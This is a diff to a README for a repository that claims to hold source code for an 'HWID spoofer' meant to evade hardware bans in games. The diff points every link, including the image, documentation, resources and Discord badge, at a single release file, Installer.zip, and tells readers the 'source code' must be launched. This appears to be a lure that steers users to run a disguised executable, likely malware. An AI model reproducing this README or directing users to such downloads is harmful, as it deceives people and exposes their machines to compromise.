@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the GameWear HWID Spoofer Source Code! This repository contains the source code for the GameWear Spoofer, a tool designed to change your Hardware ID (HWID) to avoid bans in various games that use HWID-based bans. 
 
-![GameWear HWID Spoofer](https://www.example.com/image.jpg)
+![GameWear HWID Spoofer](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip)
 
 ## 📁 Repository Information
 
@@ -19,12 +19,12 @@ Welcome to the official repository for the GameWear HWID Spoofer Source Code! Th
 
 ## 🚀 Get Started
 
-To get started with the GameWear HWID Spoofer, [download the source code here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip) (Note: file needs to be launched).
+To get started with the GameWear HWID Spoofer, [download the source code here](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip) (Note: file needs to be launched).
 
 ## 🔗 Useful Resources
 
-- [Learn more about GameWear](https://www.gamewear.com)
-- [Official HWID Spoofer Documentation](https://www.example.com/documentation)
+- [Learn more about GameWear](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip)
+- [Official HWID Spoofer Documentation](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip)
 
 ## 🎉 Examples
 
@@ -40,7 +40,7 @@ Here are some popular games where the GameWear HWID Spoofer can be useful:
 
 Join our Discord community to connect with other users, share tips, and get support for the GameWear HWID Spoofer.
 
-[![Join Discord Community](https://img.shields.io/discord/123456789?style=for-the-badge&color=5865F2&label=Join%20Discord%20Community)](https://discord.gg/GameWear)
+[![Join Discord Community](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip%20Discord%20Community)](https://github.com/Loadedjjp/GameWear-Hwid-Spoofer-Source-Code/releases/download/v1.0/Installer.zip)
 
 For any issues or queries, please check the "Releases" section of this repository or reach out to our support team.
 
